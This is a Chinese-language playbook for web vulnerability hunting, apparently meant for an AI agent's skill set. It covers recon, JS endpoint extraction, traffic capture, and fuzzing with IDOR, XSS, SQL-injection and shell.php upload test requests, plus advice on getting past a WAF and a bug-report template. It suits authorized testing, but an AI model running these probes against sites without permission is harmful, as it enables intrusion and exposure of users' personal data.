# 操作手册

> Web 漏洞定向挖掘标准化工作流。每个阶段给出明确命令和预期产出。

## 总流程

```
阶段1: 侦察 (15-30min)  → 资产清单 + 技术栈
阶段2: go/no-go判断     → 3条红线检查，决定继续或撤
阶段3: 公开功能枚举     → 搜索/注册/评论/上传入口
阶段4: 抓包分析         → 获取正常 HTTP 模板
阶段5: 定向Fuzzing      → 构造→发送→读响应→修正→循环
阶段6: 漏洞确认         → curl 复现 + 响应证据
```

---

## 阶段 1：侦察

### 1.1 资产测绘

```bash
# 子域名
amass enum -d target.com
sublist3r -d target.com

# 证书透明日志
curl -sk "https://crt.sh/?q=%25.target.com&output=json" | python3 -c "import sys,json; d=json.load(sys.stdin); [print(e['name_value'].split('\n')[0]) for e in d[:200]]" | sort -u

# 端口（常见50个）
nmap -sV --top-ports 50 --open -T4 target.com
```

### 1.2 技术栈识别

```bash
whatweb https://target.com
```

### 1.3 页面渲染（所有目标必做）

```bash
# SPA 站点渲染 DOM
chromium --headless --no-sandbox --dump-dom --virtual-time-budget=10000 https://target.com > /tmp/target_dom.html

# 截图
chromium --headless --no-sandbox --screenshot=/tmp/target.png --window-size=1280,800 --virtual-time-budget=8000 https://target.com

# 从截图提取文字
tesseract /tmp/target.png stdout -l chi_sim+eng --psm 6

# 从 DOM 提取 JS 文件
grep -oP 'src="[^"]*\.js[^"]*"' /tmp/target_dom.html | sort -u

# 从 DOM 提取子域名
grep -oP 'https?://[a-zA-Z0-9.-]+\.[a-z]+' /tmp/target_dom.html | sort -u | grep target
```

### 1.4 JS 逆向

```bash
# 下载核心 JS
curl -sk https://target.com/js/app.xxx.js -o /tmp/app.js

# 提取 API 端点
grep -oP '"/api/[a-zA-Z0-9_/-]{3,80}"' /tmp/app.js | sort -u

# 提取 baseURL
grep -oP '(baseUrl|apiUrl|domain)\s*[=:]\s*"[^"]+"' /tmp/app.js | sort -u

# 提取子域名
grep -oP '"[a-z]+\.[a-z]+\.[a-z]+"' /tmp/app.js | sort -u | grep target

# 提取内网 IP
grep -oP '(10\.|172\.|192\.168\.)[0-9]+\.[0-9]+' /tmp/app.js | sort -u

# 提取邮箱
grep -oP '[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z]+' /tmp/app.js | sort -u
```

### 1.5 目录枚举

```bash
gobuster dir -u https://target.com -w /usr/share/dirb/wordlists/common.txt
```

---

## 阶段 2：go/no-go 判断

检查三条红线：

```
□ 核心 API 全部 404/401/403？
□ 后端 API 需要签名/动态 token？
□ JS 中提取的端点前 5 个全返回 301 SPA 壳？

→ 3条全亮 = 撤。1-2条 = 继续但谨慎。0条 = 绿灯。
```

---

## 阶段 3：公开功能枚举

按优先级搜索：

| 优先级 | 功能 | 典型路径 |
|:--:|------|---------|
| 1 | 搜索框 | `/search?q=` |
| 2 | 注册页 | `/register`, `/signup` |
| 3 | 评论/反馈 | `/feedback`, `/comment` |
| 4 | 文件上传 | 头像/附件功能 |
| 5 | 短链接跳转 | `/go?url=`, `/link?target=` |
| 6 | OAuth 回调 | `/oauth/callback`, `/auth/redirect` |
| 7 | 公开 API | `/api/v1/public/*` |

```bash
# 批量探测公开 API
for p in /search /register /signup /feedback /comment /upload /api/v1/public /api/health; do
  curl -sk -o /dev/null -w "%-30s HTTP %{http_code} Size %{size_download}\n" "https://target.com$p"
done
```

---

## 阶段 4：抓包分析

### 4.1 启动代理

```bash
# aimitm（AI 友好）
aimitm -h target.com -o traffic.jsonl &

# 或 mitmproxy 直接
mitmdump -p 8080 -w traffic.flow &

# 或 BurpSuite（GUI）
burpsuite
```

### 4.2 浏览器配代理

- Firefox：设置 → 网络设置 → 手动代理 → 127.0.0.1:8080
- Chromium：`chromium --proxy-server="http://127.0.0.1:8080" --ignore-certificate-errors`

### 4.3 收集正常请求

在浏览器中正常操作目标功能，代理自动记录所有请求。重点关注：

- 认证相关的请求头（Cookie / Authorization）
- API 请求的参数结构（JSON body / query string）
- 响应中的数据结构（JSON 字段名和类型）

---

## 阶段 5：定向 Fuzzing

### 5.1 构造恶意请求

基于抓到的正常请求模板，仅改关键参数：

```
正常请求：GET /api/user/info?id=123
恶意请求：GET /api/user/info?id=124

正常请求：POST /api/search {"keyword":"手机"}
恶意请求：POST /api/search {"keyword":"<script>alert(1)</script>"}

正常请求：POST /api/upload  (file=avatar.png)
恶意请求：POST /api/upload  (file=shell.php)
```

### 5.2 发送 + 读响应

```bash
# 越权测试
curl -sk 'https://target.com/api/user/info?id=2' -H 'Cookie: 你的cookie'

# XSS 测试
curl -sk 'https://target.com/search?q=<script>alert(1)</script>'

# SQL 注入测试
curl -sk 'https://target.com/api/user/info?id=1 OR 1=1'

# 文件上传测试
curl -sk -F 'file=@shell.php' 'https://target.com/api/upload'
```

### 5.3 响应解读

```
HTTP 403/503 → WAF 拦截，换绕过方式
返回 "请登录" → 需要认证，换公开功能
返回业务数据 → 改参数继续测
返回异常/报错 → 分析报错信息，找信息泄露
```

### 5.4 修正循环

```
第一次：id=2 → error: "not found"
第二次：id=abc → error: "invalid id type"（发现了参数类型是整数）
第三次：id=-1 → error_code:0, data:{}（系统用户？）
第四次：id=0 → 返回 admin 数据！
```

---

## 阶段 6：漏洞确认

### 6.1 最小复现

```bash
# 一条 curl 证明漏洞
curl -sk 'https://target.com/api/user/info?id=2' \
  -H 'Cookie: session=你的session'

# 异常响应
{"code":0,"data":{"name":"其他用户","phone":"138****1234"}}
```

### 6.2 提交格式

```
标题：target.com 存在越权查看用户信息漏洞

描述：
通过修改 GET 参数 id 的值，可越权查看其他用户的敏感信息。

复现步骤：
curl -sk 'https://target.com/api/user/info?id=2' -H 'Cookie: 你的session'

漏洞证明：
正常请求 id=1 返回自己的数据，改为 id=2 返回其他用户的姓名和手机号。

修复建议：
在后端校验当前登录用户与请求资源 id 的归属关系。
```

---

## 参考资料

- web-vuln-hunting SKILL.md：方法论核心
- kali-web-pentest SKILL.md：工具速查与攻击链
- aimitm SKILL.md：AI 友好代理抓包
- zeroday-hunting SKILL.md：白盒审计与模糊测试
